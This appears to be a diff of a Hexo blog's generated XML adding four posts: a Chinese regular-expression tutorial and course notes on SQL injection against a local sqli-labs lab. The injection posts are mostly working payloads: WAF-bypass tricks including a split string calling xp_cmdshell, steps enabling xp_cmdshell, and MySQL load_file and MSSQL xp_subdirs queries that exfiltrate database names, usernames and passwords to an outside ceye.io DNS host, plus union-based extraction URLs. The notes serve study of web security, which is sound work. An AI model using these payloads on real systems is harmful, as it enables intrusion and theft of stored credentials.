@@ -4,6 +4,338 @@
   
     
     <entry>
+      <title>正则表达式</title>
+      <link href="/2019/09/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
+      <url>/2019/09/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+      
+        <content type="html"><![CDATA[<h1 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h1><pre><code>Windows/Dos下的通配符 *和?    \b 单词的开头或结尾，单词的分界处    .  匹配除了换行符以外的任意字符。    *  指定数量，前边的内容可以连续重复出现任意次以使整个表达式得到匹配    .*  任意数量的不包含换行的字符        \bhi\b.*\bLucy\b        匹配单词hi，任意个字符，不能使换行，最后匹配Lucy    \d    匹配一位数字-     只匹配它本身或者减号0\d{2}-\d{8}    {2} 必须连续重复匹配两次    {8} 必须连续重复匹配8次    \s    匹配任意的空白符，包括空格，制表符（Tab），换行符，中文全角空格等。    \w    匹配字符或数字或下划线或汉字等        对于中文/汉字的特殊处理是由于 .Net提供的正则表达式引擎的支持，其它情况下需要查看相关文档        \ba\w*\b    匹配以字母a开头的单词，是以任意数量的字母或数字，在单词结束处    \d+ 匹配1个或更多连续的数字。    + 和 * 类似，区别：*（可能是0次） +（可能1次或更多）        \b\w{6}\b    匹配刚好6个字母/数字的单词</code></pre><p><strong>常用的元字符</strong></p><p><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/20190907080026522.png" alt></p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>规则从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，依次类推。向后引用用于重复搜索前面某个分组匹配的文本。</p><pre><code>Eg：\1 代表分组 1 匹配的文本。        \b(\w+)\b\s+\1\b        \b(\w)\b 匹配单词     \s+ 匹配任意空白符  \1这里等价于 \b(\w+)    自定义子表达式    (?&lt;word&gt;\w+) 或者 (?’word’\w+)    将该组名指定为word</code></pre><h2 id="常用的分组-语法"><a href="#常用的分组-语法" class="headerlink" title="常用的分组 ()语法"></a>常用的分组 ()语法</h2><pre><code>    捕获：          (exp)            匹配exp，并捕获文本到自动命名的组里          (?&lt;name&gt;exp)    匹配exp，并捕获文本到名称为 name的组里（也可写成 (?’name’exp) ）          (?:exp)            匹配exp，不捕获匹配的文本，也不给此分组分配组号    零宽断言：          (?=exp)        匹配exp前面的位置          (?&lt;=exp)        匹配exp后面的位置          (?!exp)            匹配后面跟的不是exp的位置          (?&lt;!exp)        匹配前面不是exp的位置    注释：          (?#comment)    这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读</code></pre><h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>用于查找某些东西（但并不包括这些内容）之前或之后的东西。它们像 \b ^ $ 那样用于指定一个位置。断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配</p><pre><code>        \b\w+(?=ing\b)        匹配以ing结尾的单词的前面部分（除了ing以外的部分）        (?&lt;=\bre)\w+\b        匹配以re开头的单词的后半部分（除了re以外的部分）</code></pre><h2 id="零度负预测先行断言"><a href="#零度负预测先行断言" class="headerlink" title="零度负预测先行断言"></a>零度负预测先行断言</h2><p>查找不是某个字符或某个字符类里的字符的方法（反义）</p><pre><code>(?!exp) 断言此位置的后面不能匹配表达式 exp        \d{3}(?!\d)，匹配三位数字，而且这三位数字的后面不能是数字        \b((?!abc)\w)+\b    匹配不包含连续字符串 abc的单词        \b\w*q[^u]\w*\b     包含后面不是字母u的字母q的单词出现的问题，如果q出现词尾，会自动将词后的符号给[^u]，负向零断言就可以解决此问题。特点：只匹配不消耗字符。        修改后：        \b\w*q(?!u)\w*\b</code></pre><h2 id="零度正回顾后发断言"><a href="#零度正回顾后发断言" class="headerlink" title="零度正回顾后发断言"></a>零度正回顾后发断言</h2><pre><code>(?&lt;!exp)         断言此位置的前面不能匹配表达式exp(?&lt;![a-z])\d{7}    匹配前面不是小写字母的七位数字        (?&lt;=&lt;(\w+)&gt;).*(?&lt;=&lt;\/\1&gt;)                (?&lt;=&lt;(\w+)&gt;)    等价于  (?&lt;=exp)        exp= &lt;(\w+)&gt;        .*    匹配任意字符        (?&lt;=&lt;\/\1&gt;)    等价于    (?&lt;=exp)        exp= &lt;\/\1&gt;    其中 \/ 是转义 \1是后向引用（别名）        匹配出来的结果类似于 &lt;b&gt;字符&lt;/b&gt;</code></pre><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>(?#comment) 包含注释。</p><pre><code>    要包含注释，最好启用“忽略模式里的空白符”，这样在编写表达式时能任意的添加空格。    启用“忽略模式里的空白符”，在#后面到这一行结束的所有文本都将被当成注释忽略掉    (?&lt;=&lt;(\w+)&gt;).*(?&lt;=&lt;\/\1&gt;) 可以改写为        (?&lt;= #        断言要匹配的文本前缀        &lt;(\w+)&gt; #        查找 &lt;字母或数字&gt;    （即HTML/XML标签）        ) #            前缀结束        .* #            匹配任意文本        (?= #        匹配任意文本        &lt;\/\1&gt; #        查找 &lt;&gt; 起来的内容        ) #            后缀结束</code></pre><h2 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h2><p>在使整个表达式能得到匹配的前提下匹配尽可能多的字符。</p><pre><code>a.*b        它将会匹配最长的以 a开始，以b结束的字符串    </code></pre><h2 id="懒惰匹配"><a href="#懒惰匹配" class="headerlink" title="懒惰匹配"></a>懒惰匹配</h2><p>在使整个表达式能得到匹配的前提下匹配尽可能少的字符。</p><pre><code>a.*?b    会匹配尽可能短的 以a开始，以b结束的字符串</code></pre><p> <strong>正则表达式的规则：最先开始的匹配拥有最高的优先权</strong><br><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/20190907081143015.png" alt></p><h1 id="正则表达式常用的处理选项"><a href="#正则表达式常用的处理选项" class="headerlink" title="正则表达式常用的处理选项"></a>正则表达式常用的处理选项</h1><p>C#中，可以使用Regex(String,RegexOptions) 构造函数来设置<br>.Net中可以常用的正则表达式选项<br><img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/20190907081258797.png" alt><br><strong>说明：单行模式和多行模式之间没有任何关系，更改的是通配符的含义</strong></p><h2 id="平衡组-递归匹配"><a href="#平衡组-递归匹配" class="headerlink" title="平衡组/递归匹配"></a>平衡组/递归匹配</h2><p>由 .Net支持，其他语言/库不一定</p><pre><code>    (?’group’)            把捕获的内容命名为 group 并压入堆栈（类似入栈）    (?’-group’)        从堆栈上弹出最后压入堆栈的名为 group 的捕获内容，如果堆栈本来为空，则本分组匹配失败（类似出栈）    (?(group)yes|no)    如果堆栈上存在以名为 group 的捕获内容，继续匹配 Yes部分的表达式，否则继续匹配 No部分的表达式    (?!)                零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</code></pre><p>事例</p><pre><code>        &lt; #                        最外层的左括号            [^&lt;&gt;]* #                匹配括号的内容            (                (                    (?’open’&lt;) #    把捕获到的open压入栈                    [^&lt;&gt;]* #        匹配不是括号的内容                )+                (                    (?’-open’) #    把捕获到的open出栈                    [^&lt;&gt;]* #        匹配不是括号的内容                )+            )*            (?(open)(?!)) #        判断栈中是否存在open，有则匹配失败        &gt; #                        最外层的右括号</code></pre><pre><code>平衡组最常见的就是匹配HTML，匹配&lt;div&gt;的例子</code></pre><pre><code>    &lt;div[^&gt;]*&gt;[^&lt;&gt;]*(((?&#39;Open&#39;&lt;div[^&gt;]*&gt;)[^&lt;&gt;]*)+((?&#39;-Open&#39;&lt;/div&gt;)[^&lt;&gt;]*)+)*(?(Open)(?!))&lt;/div&gt;        &lt;div[^&gt;]*&gt; #                            头标签            [^&lt;&gt;]* #                            匹配不是 &lt;&gt;的内容            (                (                    (?&#39;Open&#39;&lt;div[^&gt;]*&gt;) #        将 &lt;div[^&gt;]*&gt;名成别名 open压入栈中                    [^&lt;&gt;]* #                    匹配不是 &lt;&gt;的内容                )+ #                            该元组重复1或更多次                (                    (?&#39;-Open&#39;&lt;/div&gt;) #         将 &lt;div[^&gt;]*&gt;名成别名 open出栈                    [^&lt;&gt;]*                    匹配不是 &lt;&gt;的内容                )+ #                            该元组重复1或更多次            )* #                                整个元组重复0或一次            (?(Open)(?!))                        判断栈中是否还存在Open别名的元组，有则不匹配        &lt;/div&gt; #                                闭合标签</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>绕WAF</title>
+      <link href="/2019/09/07/%E7%BB%95WAF/"/>
+      <url>/2019/09/07/%E7%BB%95WAF/</url>
+      
+        <content type="html"><![CDATA[<h1 id="waf处理数据的模式"><a href="#waf处理数据的模式" class="headerlink" title="waf处理数据的模式"></a>waf处理数据的模式</h1><pre><code>    确认身份        白名单=〉通过    大部分企业内部用来数据交流        非白名单=〉数据分析                    规则匹配（正则表达式过滤信息）</code></pre><h2 id="大致分类"><a href="#大致分类" class="headerlink" title="大致分类"></a>大致分类</h2><pre><code>1．    硬件waf：性能好，功能全面，厂商的盈利点2．    软件waf：安装简单，易使用3．    代码waf：简单有效4．    云waf：</code></pre><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="常见的注释符："><a href="#常见的注释符：" class="headerlink" title="常见的注释符："></a>常见的注释符：</h3><pre><code>//，--，/**/，--+，-- -，/*!*/ 只有MySQL能识别，在注释里的语句会被执行                  50000表示假如，数据库在5.00.00以上版本，会被识别</code></pre><h3 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="利用编码绕过"></a>利用编码绕过</h3><p>url编码<br>十六进制编码<br>unicode编码<br>特殊字符代替空格</p><h3 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h3><p>函数与变量</p><pre><code>            hex()、bin()  ==&gt; ascii()            sleep() ==&gt; benchmark()            concat_ws() ==&gt; group_concat()            mid()、substr() ==&gt; substring()            @@version ==&gt; version()            @@datadir ==&gt; datadir()</code></pre><h3 id="逻辑符号"><a href="#逻辑符号" class="headerlink" title="逻辑符号"></a>逻辑符号</h3><pre><code>            and          &amp;&amp;            or          ||            在不能用 = 考虑使用  &lt; &gt; </code></pre><h3 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h3><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><pre><code>      + 用来连接字符串 – 也可用来连接字符串 . 也可用来连接字符串，都可以跳过空格和关键字过滤            @ 一个@表示用户定义，@@表示系统变量            () 绕过空格</code></pre><h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><pre><code>            ‘se’+’lec’+’t’            %S%E%L%E%C%T 1            ?id=1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell’’ net user” ’)            !和() ‘or.--+2=--!!!’2</code></pre><h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><p>有些WAF，将admin dede install等特殊目录作为白名单</p><h3 id="HTTP参数控制"><a href="#HTTP参数控制" class="headerlink" title="HTTP参数控制"></a>HTTP参数控制</h3><pre><code>    对查询语句的参数修改，包括HTTP方法、HTTP头控制        1．    http重复参数污染        2．    http分割注入</code></pre><h3 id="变量带入方式"><a href="#变量带入方式" class="headerlink" title="变量带入方式"></a>变量带入方式</h3><pre><code>对于防注释的，使用内联的方式绕过</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第八周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mysql和Mssql盲注外带数据的DNS查询方式</title>
+      <link href="/2019/09/07/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/"/>
+      <url>/2019/09/07/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/</url>
+      
+        <content type="html"><![CDATA[<h1 id="DNS查询的准备"><a href="#DNS查询的准备" class="headerlink" title="DNS查询的准备"></a>DNS查询的准备</h1><h2 id="注册帐户"><a href="#注册帐户" class="headerlink" title="注册帐户"></a>注册帐户</h2><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907052155587.png" alt></p><h1 id="MySQL外带数据进行DNS查询"><a href="#MySQL外带数据进行DNS查询" class="headerlink" title="MySQL外带数据进行DNS查询"></a>MySQL外带数据进行DNS查询</h1><p>相对简单，使用 load_file() 即可<br>查看相关配置</p><pre><code>show global variables like &#39;%secure%&#39;;</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035312660.png" alt></p><pre><code>Secure_file_priv 必须为空才可以，null不行修改配置文件</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035342010.png" alt><br>重启MySQL即可<br>检测 能否使用 load_file() 注意转义字符<br><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035351858.png" alt><br>尝试DNS服务器发送信息</p><pre><code>    Select load_file(concat(&#39;\\\\&#39;,version(),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));    </code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035429123.png" alt><br><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907035458909.png" alt></p><h1 id="mysql数据库在windows系统中DNS外带数据方式注入"><a href="#mysql数据库在windows系统中DNS外带数据方式注入" class="headerlink" title="mysql数据库在windows系统中DNS外带数据方式注入"></a>mysql数据库在windows系统中DNS外带数据方式注入</h1><p><em>开启权限，参照MySQL利用外带数据进行DNS查询</em><br>1。查库</p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select database()),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907040442291.png" alt><br>2。查表</p><pre><code>select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907040506762.png" alt></p><pre><code>select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 1,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907040523050.png" alt><br>3。查列</p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select  column_name from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39; limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041037342.png" alt></p><pre><code>依次类推分别是 ‘anquan’,’avatar’,’email’,’id’,’passwd’,’sex’,’uname’</code></pre><p>4。查内容</p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select id from item.users limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041218856.png" alt></p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select uname from item.users limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041233795.png" alt></p><pre><code>select load_file(concat(&#39;\\\\&#39;,( select passwd from item.users limit 0,1),&#39;.zzzz.mtvtgy.ceye.io\\a&#39;));</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907041319797.png" alt><br>依次类推即可查处所有的数据信息。</p><h1 id="利用mssql数据库的四种DNS外带数据的方式注入"><a href="#利用mssql数据库的四种DNS外带数据的方式注入" class="headerlink" title="利用mssql数据库的四种DNS外带数据的方式注入"></a>利用mssql数据库的四种DNS外带数据的方式注入</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>MSSQL SQLI Labs 6<br>确定是 ‘ 布尔延时盲注，使用多语句<br>1。获取当前表名</p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907042844308.png" alt><br>2。获取该库下的表</p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 table_name from(select top 1 table_name from INFORMATION_SCHEMA.tables order by 1 desc ) as b order by 1 asc);exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907043241063.png" alt></p><pre><code>通过修改第二个top 的数 2,3,4,即可一次遍历出所有的表分别是    eamils;uagents;referers;users</code></pre><p>3。获取表下的列 </p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 column_name from  INFORMATION_SCHEMA.COLUMNS);exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907045456186.png" alt></p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 column_name from  INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME not in (&#39;id&#39;));exec(&#39;master..xp_subdirs &quot;//&#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io\\a&quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907045518927.png" alt></p><pre class="line-numbers language-以此类推以此确定有"><code class="language-以此类推以此确定有"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4。获取字段,以users为例</p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 username from (select top 1 username from users order by 1 desc) as b order by 1 asc);exec(&#39;master..xp_subdirs &quot;ping &#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io &quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907050051344.png" alt></p><pre><code>至此xp_subdirs爆字段完成。因为之前尝试过xp_subdirs、xp_dirtree和xp_fileexist方式几乎一致，使用xp_cmdshell方式进行爆破</code></pre><h1 id="xp-cmdshell-开启"><a href="#xp-cmdshell-开启" class="headerlink" title="xp_cmdshell 开启"></a>xp_cmdshell 开启</h1><pre><code>sp_configure &#39;show advanced options&#39;,1reconfiguregosp_configure &#39;xp_cmdshell&#39;,1reconfigurego</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907051948152.png" alt></p><pre><code>http://192.168.75.133/less-6.asp?id=2; declare @a varchar(1024);set @a=(select top 1 username from (select top 1 username from users order by 1 desc) as b order by 1 asc);exec(&#39;master..xp_cmdshell &quot;ping &#39;%2B@a%2B&#39;.zzzz.mtvtgy.ceye.io &quot; &#39;);</code></pre><p><img src="/Mysql%E5%92%8CMssql%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E7%9A%84DNS%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F/20190907052010885.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第八周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Access数据库的union查询</title>
+      <link href="/2019/09/07/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+      <url>/2019/09/07/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+      
+        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>在win2008上搭建的 mssql-sqli-labs环境<br>目标：Lab1，判断为 ‘ 注入</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1。order by 3 确定有 3 列<br><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025435888.png" alt><br>2。</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; –</code></pre><p><strong>mssql数字和字符串不能一起使用</strong><br><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025600225.png" alt><br>3。查询版本</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,@@version --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025642305.png" alt><br>4。获database()名称</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,db_name()--</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025724663.png" alt><br>5。获取当前用户名</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025802728.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,system_user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025823400.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,current_user  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025842366.png" alt></p><pre><code>获取服务器主机信息http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,@@servername  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025910932.png" alt><br>6。查询库名</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select count(schema_name) from information_schema.schemata)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907025951185.png" alt></p><pre><code>然后依次导出http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 schema_name from information_schema.schemata where schema_name not in (&#39;dbo&#39;,&#39;db_accessadmin&#39;,&#39;db_backupoperator&#39;,&#39;db_datareader&#39;,&#39;db_datawriter&#39;,&#39;db_ddladmin&#39;,&#39;db_denydatareader&#39;,&#39;db_denydatawriter&#39;,&#39;db_owner&#39;,&#39;db_securityadmin&#39;,&#39;guest&#39;,&#39;INFORMATION_SCHEMA&#39;,&#39;sys&#39;))  --</code></pre><p>7。找表名</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables  )  -- </code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030312129.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables where table_name not in (&#39;emails&#39;)  )  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030335203.png" alt></p><pre><code>依次类推爆出四个表http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 table_name from information_schema.tables where table_name not in (&#39;emails&#39;,&#39;uagents&#39;,&#39;referers&#39;,&#39;users&#39;)  )  --</code></pre><p>8。爆表中的列</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 column_name from information_schema.columns where table_name=&#39;emails&#39;)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030423979.png" alt></p><pre><code>依次爆出字段http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 column_name from information_schema.columns where column_name not in (&#39;id&#39;,&#39;email_id&#39;,&#39;uagent&#39;,&#39;ip_address&#39;,&#39;username&#39;,&#39;referer&#39;,&#39;password&#39;))  --</code></pre><p>9。以emails表为例</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1id from emails)  --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030535374.png" alt></p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 email_id from emails ) --</code></pre><h2 id="盲注查询version"><a href="#盲注查询version" class="headerlink" title="盲注查询version"></a>盲注查询version</h2><p>1。确定version()字符串长度</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;, (select top 1 email_id from emails ) --</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030706821.png" alt><br>2。取单个字符进行ASCII比较</p><pre><code>http://192.168.75.133/less-1.asp?id=1&#39; and ascii(substring(@@version,1,1)) &gt; 76 